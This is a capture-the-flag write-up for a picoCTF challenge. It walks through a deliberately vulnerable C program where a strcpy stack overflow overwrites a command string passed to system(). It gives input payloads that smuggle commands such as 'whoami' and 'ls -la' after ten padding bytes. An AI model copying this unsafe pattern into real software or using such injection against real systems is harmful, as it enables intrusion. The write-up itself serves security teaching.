# URL
https://play.picoctf.org/practice/challenge/525
# Concept
* variable overwrite
* stack buffer overflow
* OS command injection
# Source Code
```
#include <string.h>
#include <stdio.h>
#include <stdlib.h> 

void fun(char *name, char *cmd);

int main() {
    char name[200];
    printf("What is your name?\n");
    fflush(stdout);


    fgets(name, sizeof(name), stdin);
    name[strcspn(name, "\n")] = 0;

    fun(name, "uname");
    return 0;
}

void fun(char *name, char *cmd) {
    char c[10];
    char buffer[10];

    strcpy(c, cmd);
    strcpy(buffer, name);

    printf("Goodbye, %s!\n", buffer);
    fflush(stdout);
    system(c);
}

```
# Method of solve
* according to the source code, the binary runs the `uname` command through the `fun()` function:
```
void fun(char *name, char *cmd) {
    char c[10];
    char buffer[10];

    strcpy(c, cmd);
    strcpy(buffer, name);

    printf("Goodbye, %s!\n", buffer);
    fflush(stdout);
    system(c);
}
fun(name, "uname");
```
* The string `uname` is passed to the `c` variable via the `strcpy` function
* the same function uses the user-controlled variable `name`, which is passed to the buffer variable via the memory-unsafe `strcpy` function:
```
char name[200];
fgets(name, sizeof(name), stdin);
strcpy(buffer, name);
```
* the point of buffer overflow is the `buffer` variable, which has a size of only 10 bytes, and because it is initialized after the `c` variable, stack buffer overflow will allow the overwrite of the `c` variable
```
char c[10];
char buffer[10];
```
* so any user input in excess of 10 bytes will overflow into the `c` variable and be executed as a system command
* with a little bit of experimentation, we find out immediately after the 10th byte, we can inject into the system command, so we can run a payload like this:
```
1234567890whoami
```
* then enumerate the system
```
1234567890ls -la
```
